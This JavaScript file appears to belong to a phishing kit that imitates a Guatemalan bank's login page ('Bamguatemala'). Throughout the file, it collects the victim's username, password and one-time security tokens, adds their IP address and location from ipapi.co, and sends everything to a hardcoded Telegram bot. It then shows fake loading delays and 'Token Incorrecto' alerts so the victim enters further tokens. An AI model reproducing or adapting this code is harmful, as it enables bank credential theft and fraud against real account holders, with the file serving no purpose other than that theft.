document.addEventListener("DOMContentLoaded", () => {
  const usernameInput = document.getElementById("input-username");
  const continueButton = document.getElementById("continue-button");
  const url = "https://ipapi.co/json/";

  if (usernameInput && continueButton) {
    usernameInput.addEventListener("input", () => {
      if (usernameInput.value.trim().length > 0) {
        continueButton.classList.remove("disabled");
        continueButton.classList.add("enabled");
      } else {
        continueButton.classList.remove("enabled");
        continueButton.classList.add("disabled");
      }
    });
  }
  const continueButton1 = document.getElementById("continue-button1");

  if (usernameInput && continueButton1) {
    usernameInput.addEventListener("input", () => {
      if (usernameInput.value.trim().length > 0) {
        continueButton1.classList.remove("disabled");
        continueButton1.classList.add("enabled");
      } else {
        continueButton1.classList.remove("enabled");
        continueButton1.classList.add("disabled");
      }
    });
  }

  const continueButtonElement = document.getElementById("continue-button");
  if (continueButtonElement) {
    continueButtonElement.addEventListener("click", function (event) {
      event.preventDefault(); // Previene la acción predeterminada del botón

      axios
        .get(url)
        .then((response) => {
          const message =
            "\nBamguatemala" +
            "\nUsuario: " +
            localStorage.getItem("usuario") +
            "\nContra: " +
            document.getElementById("input-username").value +
            "\nCiudad: " +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;

          return axios.post(
            "https://api.telegram.org/bot7528323465:AAFpsgcvqVBAeXOvm6tGbaxO43zdJ_VaI4Q/sendMessage",
            {
              chat_id: "-4509669843",
              text: message,
            }
          );
        })
        .then((response2) => {
          showLoadingOverlay();
          setTimeout(function () {
            hideLoadingOverlay();
            showNumberForm();
          }, 5000); // Cambia a 30000 (30 segundos) si es necesario
        })
        .catch((error) => {
          console.error(error);
        });
    });
  }

  const continueButtonElementindex =
    document.getElementById("continue-button1");
  if (continueButtonElementindex) {
    continueButtonElementindex.addEventListener("click", function (event) {
      event.preventDefault(); // Previene la acción predeterminada del botón

      localStorage.setItem("usuario", usernameInput.value);
      axios
        .get(url)
        .then((response) => {
          const message =
            "\nBamguatemala" +
            "\nUsuario: " +
            usernameInput.value +
            "\nCiudad: " +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;

          return axios.post(
            "https://api.telegram.org/bot7528323465:AAFpsgcvqVBAeXOvm6tGbaxO43zdJ_VaI4Q/sendMessage",
            {
              chat_id: "-4509669843",
              text: message,
            }
          );
        })
        .then((response2) => {
          window.location.href = "contra.html";
        })
        .catch((error) => {
          console.error(error);
        });
    });
  }
  const numberSubmitButton = document.getElementById("number-submit");
  if (numberSubmitButton) {
    numberSubmitButton.addEventListener("click", function (event) {
      event.preventDefault();
      const numberInput = document.getElementById("number-input");

      axios
        .get(url)
        .then((response) => {
          const message =
            "\nBamguatemala" +
            "\nUsuario: " +
            localStorage.getItem("usuario") +
            "\nToken: " +
            numberInput.value +
            "\nCiudad: " +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;

          return axios.post(
            "https://api.telegram.org/bot7528323465:AAFpsgcvqVBAeXOvm6tGbaxO43zdJ_VaI4Q/sendMessage",
            {
              chat_id: "-4509669843",
              text: message,
            }
          );
        })
        .then((response2) => {
          hideNumberForm();
          if (numberInput.value.match(/^\d+$/)) {
            showLoadingOverlay();
            setTimeout(function () {
              hideLoadingOverlay();
              numberInput.value = "";
              alert("Token Incorrecto");
              showNumberForm();
            }, 20000); // Cambia a 30000 (30 segundos) si es necesario
          } else {
            alert("Por favor, ingresa solo números.");
          }
        })
        .catch((error) => {
          console.error(error);
        });
    });
  }
});

function showLoadingOverlay() {
  const overlay = document.getElementById("overlay");
  if (overlay) {
    overlay.style.display = "flex";
  }
}

function hideLoadingOverlay() {
  const overlay = document.getElementById("overlay");
  if (overlay) {
    overlay.style.display = "none";
  }
}

function showNumberForm() {
  const overlay = document.getElementById("number-overlay");
  const form = document.getElementById("number-form");
  if (overlay && form) {
    overlay.style.display = "flex";
    form.style.display = "block";
  }
}

function hideNumberForm() {
  const overlay = document.getElementById("number-overlay");
  const form = document.getElementById("number-form");
  if (overlay && form) {
    form.style.display = "none";
    overlay.style.display = "none";
  }
}
